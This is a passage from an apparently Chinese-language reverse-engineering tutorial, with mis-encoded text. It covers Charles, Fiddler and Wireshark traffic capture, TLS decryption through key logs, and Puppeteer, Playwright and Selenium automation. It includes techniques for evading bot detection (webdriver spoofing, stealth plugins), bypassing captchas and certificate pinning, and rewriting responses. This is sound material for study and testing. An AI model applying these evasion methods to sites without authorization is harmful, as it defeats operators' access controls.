      <h2 id="4-ç§»åŠ¨ç«¯æŠ“åŒ…">4. ç§»åŠ¨ç«¯æŠ“åŒ…</h2>

      <ol>
        <li><strong>PC é…ç½®</strong>: å¼€å¯ &#8220;Allow remote computers to connect"ï¼Œé‡å¯ Fiddlerã€‚</li>
        <li><strong>æ‰‹æœºé…ç½®</strong>: è®¾ç½®ä»£ç†ä¸º PC IP + 8888ã€‚</li>
        <li><strong>å®‰è£…è¯ä¹¦</strong>: æ‰‹æœºæµè§ˆå™¨è®¿é—® <code>http://ipv4:8888</code>ï¼Œç‚¹å‡»é“¾æ¥ä¸‹è½½è¯ä¹¦ã€‚</li>
        <li><strong>æ³¨æ„</strong>: å³ä½¿åœ¨ PC ç«¯ï¼Œä¹Ÿå¯ä»¥ç”¨ &#8220;FiddlerScript&#8221; æ§åˆ¶æ‰‹æœºçš„æµé‡ã€‚</li>
      </ol>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>å¦‚æœä½ éœ€è¦æå…¶å¤æ‚çš„ä¸­é—´äººé€»è¾‘ï¼ˆæ¯”å¦‚ï¼šè¯·æ±‚ A è¿”å› -> è§£æå‡º Token -> è‡ªåŠ¨å‘è¯·æ±‚ Bï¼‰ï¼ŒFiddlerScript æ˜¯æœ€ä½³é€‰æ‹©ã€‚</p>

    </div>

    <div class="section" id="02-Tooling-charles-guide">
      <h2>18. Charles Guide</h2>
      <h1 id="charles-proxy-æŒ‡å—">Charles Proxy æŒ‡å—</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Charles æ˜¯ Mac/Windows ä¸Šæœ€æµè¡Œçš„æŠ“åŒ…å·¥å…·ä¹‹ä¸€ï¼Œä»¥å…¶ç•Œé¢ç®€æ´ã€åŠŸèƒ½å®ç”¨è‘—ç§°ã€‚åœ¨ç§»åŠ¨ç«¯ï¼ˆAndroid/iOSï¼‰é€†å‘ä¸­ï¼ŒCharles å¾€å¾€æ˜¯é¦–é€‰çš„æŠ“åŒ…å·¥å…·ã€‚</p>

      <hr />

      <h2 id="1-åŸºç¡€é…ç½®">1. åŸºç¡€é…ç½®</h2>

      <h3 id="æŠ“å–-https">æŠ“å– HTTPS</h3>

      <ol>
        <li><strong>PC ç«¯å®‰è£…è¯ä¹¦</strong>: <code>Help -&gt; SSL Proxying -&gt; Install Charles Root Certificate</code>ã€‚</li>
        <li><strong>ç§»åŠ¨ç«¯å®‰è£…è¯ä¹¦</strong>:
          <ul>
            <li>
              <code>Help -&gt; SSL Proxying -&gt; Install Charles Root Certificate on a Mobile Device or Remote Browser</code>ã€‚
            </li>
            <li>æ‰‹æœºè®¾ç½®ä»£ç†åˆ° Charlesï¼Œæµè§ˆå™¨è®¿é—® <code>chls.pro/ssl</code> ä¸‹è½½å®‰è£…ã€‚</li>
            <li><strong>æ³¨æ„</strong>: Android 7.0+ é»˜è®¤ä¸ä¿¡ä»»ç”¨æˆ·å®‰è£…çš„è¯ä¹¦ï¼Œéœ€è¦å°†è¯ä¹¦å®‰è£…åˆ°ç³»ç»Ÿåˆ†åŒºï¼ˆéœ€ Rootï¼‰ï¼Œæˆ–ä½¿ç”¨ VirtualXposed / Frida Hook ç»•è¿‡ã€‚
            </li>
          </ul>
        </li>
        <li><strong>å¼€å¯ SSL ä»£ç†</strong>: <code>Proxy -&gt; SSL Proxying Settings</code>ï¼Œæ·»åŠ  <code>*:443</code>ã€‚</li>
      </ol>

      <hr />

      <h2 id="2-æ ¸å¿ƒåŠŸèƒ½">2. æ ¸å¿ƒåŠŸèƒ½</h2>

      <h3 id="map-local-æœ¬åœ°æ˜ å°„">Map Local (æœ¬åœ°æ˜ å°„)</h3>

      <p>è¿™æ˜¯<strong>æ›¿æ¢çº¿ä¸Šæ–‡ä»¶</strong>æœ€å¸¸ç”¨çš„åŠŸèƒ½ã€‚</p>

      <ul>
        <li><strong>åœºæ™¯</strong>: ä½ åç¼–è¯‘äº†ä¸€ä¸ª JS æ–‡ä»¶ï¼Œå»é™¤äº†åè°ƒè¯•ä»£ç ï¼Œä¿å­˜ä¸º <code>hook.js</code>ã€‚å³ä½¿æ²¡æœ‰ Root æƒé™ï¼Œä½ ä¹Ÿå¯ä»¥è®© APP
          åŠ è½½è¿™ä¸ªæœ¬åœ°æ–‡ä»¶è€Œä¸æ˜¯çº¿ä¸Šçš„åŸå§‹æ–‡ä»¶ã€‚</li>
        <li><strong>æ“ä½œ</strong>: å³é”®è¯·æ±‚ -> <code>Map Local</code> -> Choose &#8230; (é€‰æ‹©ä½ çš„ <code>hook.js</code>)ã€‚</li>
      </ul>

      <h3 id="map-remote-è¿œç¨‹æ˜ å°„">Map Remote (è¿œç¨‹æ˜ å°„)</h3>

      <ul>
        <li><strong>åœºæ™¯</strong>: å°† APP çš„è¯·æ±‚é‡å®šå‘åˆ°ä½ è‡ªå·±çš„æœåŠ¡å™¨ã€‚</li>
        <li><strong>æ“ä½œ</strong>: å³é”®è¯·æ±‚ -> <code>Map Remote</code> -> å¡«å†™æ–°çš„ Host/Portã€‚</li>
      </ul>

      <h3 id="rewrite-é‡å†™">Rewrite (é‡å†™)</h3>

      <p>æ¯” Map åŠŸèƒ½æ›´ç»†ç²’åº¦ï¼Œç±»ä¼¼äº Burp çš„ &#8220;Match and Replace"ã€‚</p>

      <ul>
        <li><strong>æ“ä½œ</strong>: <code>Tools -&gt; Rewrite</code>ã€‚</li>
        <li><strong>åŠŸèƒ½</strong>:
          <ul>
            <li><strong>Add Header</strong>: æ·»åŠ  <code>Cookie</code> æˆ– <code>Token</code>ã€‚</li>
            <li><strong>Modify Body</strong>: æ­£åˆ™æ›¿æ¢å“åº”ä½“å†…å®¹ã€‚</li>
            <li><strong>Modify Status</strong>: æ¯”å¦‚æŠŠæœåŠ¡å™¨çš„ <code>403</code> å¼ºè¡Œæ”¹æˆ <code>200</code>ã€‚</li>
          </ul>
        </li>
      </ul>

      <h3 id="breakpoints-æ–­ç‚¹">Breakpoints (æ–­ç‚¹)</h3>

      <ul>
        <li><strong>æ“ä½œ</strong>: å³é”®è¯·æ±‚ -> <code>Breakpoints</code>ã€‚</li>
        <li><strong>åŠŸèƒ½</strong>: è¯·æ±‚å‘å‡ºå‰æ–­ä¸‹ï¼ˆä¿®æ”¹å‚æ•°ï¼‰ï¼Œå“åº”è¿”å›å‰æ–­ä¸‹ï¼ˆä¿®æ”¹æ•°æ®ï¼‰ã€‚</li>
        <li>_æ³¨æ„_: Charles çš„æ–­ç‚¹ä¼šé˜»å¡æ•´ä¸ªè¿æ¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¶…æ—¶ã€‚å¯¹äºå¤æ‚çš„é€»è¾‘ä¿®æ”¹ï¼Œå»ºè®®ç”¨ Rewrite æˆ– Map Localã€‚</li>
      </ul>

      <hr />

      <h2 id="3-ç§»åŠ¨ç«¯æŠ“åŒ…æŠ€å·§">3. ç§»åŠ¨ç«¯æŠ“åŒ…æŠ€å·§</h2>

      <h3 id="æŠ“å–é-http-åè®®-socks-proxy">æŠ“å–é HTTP åè®® (Socks Proxy)</h3>

      <p>å¦‚æœ APP ä½¿ç”¨äº†è‡ªå®šä¹‰çš„ TCP åè®®ï¼ŒCharles çš„ HTTP ä»£ç†å¯èƒ½æŠ“ä¸åˆ°ã€‚</p>

      <ul>
        <li>Charles æ”¯æŒ Socks ä»£ç†æ¨¡å¼ã€‚</li>
        <li>æˆ–è€…ç»“åˆ <strong>Postern / Drony</strong> (Android VPN APP) å°†æ‰€æœ‰æµé‡å¼ºåˆ¶è½¬å‘åˆ° Charlesã€‚</li>
      </ul>

      <h3 id="è§£å†³ä¹±ç é—®é¢˜">è§£å†³ä¹±ç é—®é¢˜</h3>

      <p>å¦‚æœæ˜¯ Protobuf æ•°æ®ï¼ŒCharles é»˜è®¤æ˜¾ç¤ºä¹±ç ã€‚</p>

      <ul>
        <li>å¯ä»¥å®‰è£… &#8220;Charles Protobuf Viewer&#8221; æ’ä»¶ã€‚</li>
        <li>æˆ–è€…å¯¼å‡º raw dataï¼Œä½¿ç”¨ <code>protoc --decode_raw</code> æŸ¥çœ‹ã€‚</li>
      </ul>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>Charles æ˜¯ç§»åŠ¨ç«¯é€†å‘çš„è½»é‡çº§åˆ©å™¨ã€‚</p>

      <ul>
        <li><strong>Map Local</strong>: æ›¿æ¢ä»£ç ï¼ŒBypass éªŒè¯ã€‚</li>
        <li><strong>Rewrite</strong>: ä¿®æ”¹åè®®å­—æ®µã€‚</li>
        <li><strong>SSL Proxying</strong>: è§£å¯† HTTPSã€‚</li>
      </ul>

    </div>

    <div class="section" id="02-Tooling-wireshark-guide">
      <h2>19. Wireshark Guide</h2>
      <h1 id="wireshark-æŒ‡å—">Wireshark æŒ‡å—</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Wireshark æ˜¯ç½‘ç»œåè®®åˆ†æçš„â€œæ˜¾å¾®é•œâ€ã€‚ä¸ Burp/Charles è¿™ç§ HTTP ä»£ç†ä¸åŒï¼ŒWireshark æ•è·çš„æ˜¯ç½‘å¡å±‚çš„åŸå§‹æ•°æ®åŒ…ï¼ˆTCP/IPï¼‰ã€‚</p>

      <p>åœ¨é€†å‘ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦ç”¨å®ƒæ¥ï¼š</p>

      <ol>
        <li>åˆ†æé HTTP çš„ç§æœ‰åè®®ï¼ˆå¦‚ WebSocket é‡Œé¢çš„äºŒè¿›åˆ¶æµï¼Œæˆ–è€… TCP é•¿è¿æ¥ï¼‰ã€‚</li>
        <li>åœ¨æ— æ³•è®¾ç½®ä»£ç†çš„æƒ…å†µä¸‹ï¼ˆå¦‚æŸäº› APP å¼€å¯äº† VPN æ£€æµ‹æˆ–ä¸èµ°ç³»ç»Ÿä»£ç†ï¼‰å¼ºåˆ¶æŠ“åŒ…ã€‚</li>
      </ol>

      <hr />

      <h2 id="1-åŸºç¡€è¿‡æ»¤-filters">1. åŸºç¡€è¿‡æ»¤ (Filters)</h2>

      <p>Wireshark çš„è¿‡æ»¤å™¨è¯­æ³•æ˜¯å¿…é¡»æŒæ¡çš„ã€‚</p>

      <h3 id="å¸¸ç”¨è¿‡æ»¤å™¨">å¸¸ç”¨è¿‡æ»¤å™¨</h3>

      <ul>
        <li><strong>æŒ‰åè®®</strong>: <code>http</code>, <code>tls</code>, <code>websocket</code>, <code>tcp</code></li>
        <li><strong>æŒ‰ IP</strong>: <code>ip.addr == 1.2.3.4</code> (æºæˆ–ç›®çš„), <code>ip.src == 1.2.3.4</code></li>
        <li><strong>æŒ‰ç«¯å£</strong>: <code>tcp.port == 443</code>, <code>udp.port == 53</code></li>
        <li><strong>æŒ‰å†…å®¹</strong>: <code>frame contains "password"</code> (äºŒè¿›åˆ¶æœç´¢)</li>
      </ul>

      <h3 id="é€»è¾‘ç»„åˆ">é€»è¾‘ç»„åˆ</h3>

      <p><code>ip.addr == 1.2.3.4 &amp;&amp; tcp.port == 8080 || http</code></p>

      <hr />

      <h2 id="2-tls-è§£å¯†-å…³é”®">2. TLS è§£å¯† (å…³é”®ï¼)</h2>

      <p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒWireshark æŠ“åˆ°çš„ HTTPS åŒ…å…¨æ˜¯ä¹±ç ï¼ˆTLS Encrypted Alertï¼‰ã€‚æˆ‘ä»¬éœ€è¦å¯¼å…¥å¯†é’¥æ‰èƒ½è§£å¯†ã€‚</p>

      <h3 id="æµè§ˆå™¨ç¯å¢ƒ-key-log">æµè§ˆå™¨ç¯å¢ƒ (Key Log)</h3>

      <p>Chrome å’Œ Firefox æ”¯æŒå°† TLS ä¼šè¯å¯†é’¥å¯¼å‡ºåˆ°æ–‡ä»¶ã€‚</p>

      <ol>
        <li><strong>è®¾ç½®ç¯å¢ƒå˜é‡</strong>:
          <ul>
            <li>Windows: <code>set SSLKEYLOGFILE=C:\keys\ssl.log</code></li>
            <li>Mac/Linux: <code>export SSLKEYLOGFILE=~/ssl.log</code></li>
          </ul>
        </li>
        <li><strong>å¯åŠ¨æµè§ˆå™¨</strong>: åœ¨åŒä¸€ä¸ªç»ˆç«¯ä¸­å¯åŠ¨æµè§ˆå™¨ï¼ˆ<code>open -a "Google Chrome"</code>ï¼‰ã€‚</li>
        <li><strong>é…ç½® Wireshark</strong>:
          <ul>
            <li><code>Preferences -&gt; Protocols -&gt; TLS (æˆ– SSL)</code>ã€‚</li>
            <li>åœ¨ <code>(Pre)-Master-Secret log filename</code> ä¸­é€‰æ‹©åˆšæ‰çš„ <code>ssl.log</code> æ–‡ä»¶ã€‚</li>
          </ul>
        </li>
        <li>æ­¤æ—¶ï¼ŒWireshark ä¸­çš„ TLS åŒ…ä¼šè‡ªåŠ¨å˜æˆè§£å¯†åçš„ HTTP2/HTTP1.1 æ˜æ–‡ã€‚</li>
      </ol>

      <h3 id="ç§»åŠ¨ç«¯ç¯å¢ƒ">ç§»åŠ¨ç«¯ç¯å¢ƒ</h3>

      <p>å¯¹äºå®‰å“ APPï¼Œå¾ˆéš¾ç›´æ¥å¯¼å‡º Key Logã€‚é€šå¸¸çš„åšæ³•æ˜¯ï¼š</p>

      <ul>
        <li>ä½¿ç”¨ Frida è„šæœ¬ Hook OpenSSL åº“çš„ <code>SSL_CTX_set_keylog_callback</code>ï¼Œå°†å¯†é’¥ dump å‡ºæ¥å¹¶é€šè¿‡ adb ä¼ å› PCã€‚</li>
        <li>æˆ–è€…ç›´æ¥ä½¿ç”¨åŸºäº Frida çš„æŠ“åŒ…å·¥å…·ï¼ˆå¦‚ r0captureï¼‰ç›´æ¥ä¿å­˜è§£å¯†åçš„ pcapã€‚</li>
      </ul>

      <hr />

      <h2 id="3-è¿½è¸ªæµ-follow-stream">3. è¿½è¸ªæµ (Follow Stream)</h2>

      <p>å³é”®ä»»æ„ä¸€ä¸ªæ•°æ®åŒ… -> <code>Follow</code> -> <code>TCP Stream</code> (æˆ– <code>TLS Stream</code> /
        <code>HTTP Stream</code>)ã€‚</p>

      <ul>
        <li>è¿™ä¼šæŠŠå±äºåŒä¸€ä¸ªè¿æ¥çš„æ‰€æœ‰æ•°æ®åŒ…é‡ç»„æˆå®Œæ•´çš„å¯¹è¯å†…å®¹ï¼Œéå¸¸ä¾¿äºåˆ†æç§æœ‰åè®®çš„æ¡æ‰‹å’Œäº¤äº’é€»è¾‘ã€‚</li>
      </ul>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>Wireshark çš„å­¦ä¹ é—¨æ§›è¾ƒé«˜ï¼Œä½†åœ¨å¤„ç†éæ ‡åè®®æˆ–åº•å±‚ç½‘ç»œå¯¹æŠ—æ—¶ï¼Œå®ƒæ˜¯æ— å¯æ›¿ä»£çš„ç»ˆæå·¥å…·ã€‚</p>

    </div>

    <div class="section" id="02-Tooling-puppeteer-playwright">
      <h2>20. Puppeteer & Playwright</h2>
      <h1 id="puppeteer-playwright">Puppeteer &amp; Playwright</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Puppeteer (åŸºäº CDP) å’Œ Playwright (æ”¯æŒå¤šæµè§ˆå™¨) æ˜¯ç°ä»£ Web è‡ªåŠ¨åŒ–çš„é¦–é€‰å·¥å…·ã€‚åœ¨é€†å‘ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨å®ƒä»¬æ¥ï¼š</p>

      <ol>
        <li><strong>åŠ¨æ€æ¸²æŸ“</strong>: æŠ“å– SPA é¡µé¢æ•°æ®ã€‚</li>
        <li><strong>æ¨¡æ‹Ÿç”¨æˆ·</strong>: ç»•è¿‡å¤æ‚çš„è¡Œä¸ºéªŒè¯ç ã€‚</li>
        <li><strong>Hook æ³¨å…¥</strong>: åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥ JS ä»£ç ã€‚</li>
      </ol>

      <hr />

      <h2 id="1-åŸºç¡€å¯åŠ¨-puppeteer">1. åŸºç¡€å¯åŠ¨ (Puppeteer)</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;puppeteer&quot;</span><span class="p">);</span>

<span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
<span class="w">    </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="c1">// é€†å‘è°ƒè¯•åŠ¡å¿…å¼€å¯æœ‰å¤´æ¨¡å¼</span>
<span class="w">    </span><span class="nx">args</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">      </span><span class="s2">&quot;--no-sandbox&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="s2">&quot;--disable-setuid-sandbox&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="s2">&quot;--ignore-certificate-errors&quot;</span><span class="p">,</span><span class="w"> </span><span class="c1">// å¿½ç•¥è¯ä¹¦é”™è¯¯ï¼ˆé…åˆæŠ“åŒ…ï¼‰</span>
<span class="w">      </span><span class="s2">&quot;--window-size=1920,1080&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="p">],</span>
<span class="w">  </span><span class="p">});</span>
<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="w">  </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s2">&quot;https://example.com&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="2-å…³é”®é€†å‘æŠ€å·§">2. å…³é”®é€†å‘æŠ€å·§</h2>

      <h3 id="æ³¨å…¥-hook-ä»£ç -evaluateonnewdocument">æ³¨å…¥ Hook ä»£ç  (evaluateOnNewDocument)</h3>

      <p>è¿™æ˜¯æœ€é‡è¦çš„åŠŸèƒ½ã€‚åœ¨é¡µé¢æ‰€æœ‰è„šæœ¬æ‰§è¡Œ<strong>ä¹‹å‰</strong>æ‰§è¡Œä½ çš„ä»£ç ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ³¨å…¥ navigator.webdriver = undefined ä»¥ç»•è¿‡æ£€æµ‹</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluateOnNewDocument</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">navigator</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;webdriver&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="kc">undefined</span><span class="p">,</span>
<span class="w">  </span><span class="p">});</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="è¯·æ±‚æ‹¦æˆª-request-interception">è¯·æ±‚æ‹¦æˆª (Request Interception)</h3>

      <p>å¯ä»¥æ‹¦æˆªã€ä¿®æ”¹ã€ä¸­æ­¢è¯·æ±‚ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">setRequestInterception</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">page</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">&quot;request&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">resourceType</span><span class="p">()</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;image&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">request</span><span class="p">.</span><span class="nx">abort</span><span class="p">();</span><span class="w"> </span><span class="c1">// åŠ é€ŸæŠ“å–</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">().</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;sign&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// ä¿®æ”¹ Header</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({},</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">headers</span><span class="p">(),</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="s2">&quot;X-Custom-Token&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;hacked&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="p">});</span>
<span class="w">    </span><span class="nx">request</span><span class="p">.</span><span class="k">continue</span><span class="p">({</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="p">});</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">request</span><span class="p">.</span><span class="k">continue</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="cdp-session-ç›´æ¥è°ƒç”¨-devtools-åè®®">CDP Session (ç›´æ¥è°ƒç”¨ DevTools åè®®)</h3>

      <p>Puppeteer å°è£…çš„åŠŸèƒ½æœ‰é™ï¼Œå¯ä»¥é€šè¿‡ CDP ç”šè‡³åšæ›´åº•å±‚çš„æ“ä½œã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">target</span><span class="p">().</span><span class="nx">createCDPSession</span><span class="p">();</span>
<span class="k">await</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&quot;Network.enable&quot;</span><span class="p">);</span>
<span class="c1">// æ¨¡æ‹Ÿå¼±ç½‘ç¯å¢ƒ</span>
<span class="k">await</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&quot;Network.emulateNetworkConditions&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">offline</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">  </span><span class="nx">latency</span><span class="o">:</span><span class="w"> </span><span class="mf">200</span><span class="p">,</span>
<span class="w">  </span><span class="nx">downloadThroughput</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="mf">780</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1024</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">8</span><span class="p">,</span>
<span class="w">  </span><span class="nx">uploadThroughput</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="mf">330</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1024</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">8</span><span class="p">,</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="3-playwright-å¯¹æ¯”">3. Playwright å¯¹æ¯”</h2>

      <p>Playwright API è®¾è®¡æ›´ç°ä»£ï¼Œä¸”åŸç”Ÿæ”¯æŒ WebKit (Safari)ã€‚</p>

      <ul>
        <li><strong>Context éš”ç¦»</strong>: <code>browser.newContext()</code> æå…¶å¿«é€Ÿåœ°åˆ›å»ºéš”ç¦»ç¯å¢ƒï¼ˆCookie äº’ä¸å¹²æ‰°ï¼‰ï¼Œé€‚åˆå¹¶å‘é‡‡é›†ã€‚</li>
        <li><strong>é€‰æ‹©å™¨å¼•æ“</strong>: æ”¯æŒ <code>text="Login"</code>, <code>css=.btn</code>, <code>xpath=//button</code>
          æ··åˆæœç´¢ï¼Œæ›´é²æ£’ã€‚</li>
      </ul>

      <hr />

      <h2 id="4-åçˆ¬è™«å¯¹æŠ—-anti-detection">4. åçˆ¬è™«å¯¹æŠ— (Anti-Detection)</h2>

      <p>ç›´æ¥ä½¿ç”¨ Puppeteer/Playwright å¾ˆå®¹æ˜“è¢«è¯†åˆ«ï¼ˆå› ä¸ºæœ‰æŒ‡çº¹ï¼‰ã€‚</p>

      <h3 id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ</h3>

      <ol>
        <li>
          <p><strong>puppeteer-extra-plugin-stealth</strong>: å¿…è£…æ’ä»¶ã€‚è‡ªåŠ¨æŠ¹é™¤å‡ åç§å¸¸è§æŒ‡çº¹ï¼ˆChrome Runtime, Navigator Permissions,
            WebGL Vendor ç­‰ï¼‰ã€‚</p>

          <div class="codehilite">
            <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;puppeteer-extra&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">StealthPlugin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;puppeteer-extra-plugin-stealth&quot;</span><span class="p">);</span>
<span class="nx">puppeteer</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">StealthPlugin</span><span class="p">());</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>æ‹ŸäººåŒ–æ“ä½œ</strong>: ä¸è¦ <code>page.click()</code> ç¬é—´ç‚¹å‡»ï¼Œè€Œæ˜¯ç§»åŠ¨é¼ æ ‡è½¨è¿¹ -> éšæœºåœé¡¿ -> æŒ‰ä¸‹ -> æŠ¬èµ·ã€‚å¯ä»¥ä½¿ç”¨
            <code>ghost-cursor</code> ç­‰åº“ã€‚</p>
        </li>
      </ol>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>å¯¹äºé€†å‘å·¥ç¨‹å¸ˆï¼ŒPuppeteer ä¸ä»…ä»…æ˜¯çˆ¬è™«å·¥å…·ï¼Œæ›´æ˜¯ä¸€ä¸ª<strong>å¯ç¼–ç¨‹çš„æµè§ˆå™¨</strong>ã€‚åˆ©ç”¨ <code>evaluateOnNewDocument</code> å’Œ
        <code>setRequestInterception</code>ï¼Œæˆ‘ä»¬å¯ä»¥æ„å»ºå‡ºå¼ºå¤§çš„åŠ¨æ€åˆ†æå’Œè§£å¯†ç¯å¢ƒã€‚</p>

    </div>

    <div class="section" id="02-Tooling-selenium-guide">
      <h2>21. Selenium Guide</h2>
      <h1 id="selenium-æŒ‡å—">Selenium æŒ‡å—</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Selenium æ˜¯ Web è‡ªåŠ¨åŒ–é¢†åŸŸçš„å…ƒè€ã€‚è™½ç„¶åœ¨è½»é‡çº§å’ŒæŠ—æ£€æµ‹æ€§ä¸Šä¸å¦‚ Puppeteer/Playwrightï¼Œä½†ç”±äºå…¶ç”Ÿæ€æˆç†Ÿã€å¤šè¯­è¨€æ”¯æŒå¥½ï¼ˆPython/Javaï¼‰ï¼Œä¾ç„¶åœ¨ä¸€äº›å¤§å‹çˆ¬è™«é¡¹ç›®ä¸­æœ‰åº”ç”¨ã€‚</p>

      <p>å¯¹äºé€†å‘å·¥ç¨‹å¸ˆæ¥è¯´ï¼Œä¸»è¦éœ€è¦äº†è§£å¦‚ä½• <strong>Bypass Selenium æ£€æµ‹</strong>ã€‚</p>

      <hr />

      <h2 id="1-åŸºç¡€ä½¿ç”¨-python">1. åŸºç¡€ä½¿ç”¨ (Python)</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.chrome.options</span><span class="w"> </span><span class="kn">import</span> <span class="n">Options</span>

<span class="n">options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">()</span>
<span class="c1"># å°½å¯èƒ½ä½¿ç”¨ CDP å‘½ä»¤æ¥è§„é¿æ£€æµ‹</span>
<span class="n">options</span><span class="o">.</span><span class="n">add_experimental_option</span><span class="p">(</span><span class="s2">&quot;excludeSwitches&quot;</span><span class="p">,</span> <span class="p">[</span><span class="s2">&quot;enable-automation&quot;</span><span class="p">])</span>
